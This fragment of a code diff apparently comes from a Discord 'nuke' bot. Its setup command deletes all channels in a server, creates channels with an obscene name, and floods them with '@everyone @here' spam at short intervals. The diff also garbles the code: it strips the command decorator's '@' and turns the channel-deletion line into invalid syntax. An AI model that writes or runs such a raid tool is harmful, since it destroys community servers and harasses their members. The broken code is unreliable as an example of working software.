@@ -24,14 +24,14 @@ async def send_messages_loop(channels, message, delay, num_messages):
             else:
                 raise
 
-@bot.command()
+bot.command()
 async def setup(ctx):
     channelname = "Ultimate-Fucker"
     message = "@everyone @here join to: "
     delay = 0.1
     num_messages = 35
 
-    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
+    await asyncio.gather(*[channel.delete channel in ctx.guild.channels])
 
     new_channels = []
 
@@ -44,5 +44,4 @@ async def setup(ctx):
     await asyncio.sleep(2)
 
     bot.loop.create_task(send_messages_loop(new_channels, message, delay, num_messages))
-
 bot.run('TOKEN-OF-THE-BOT')
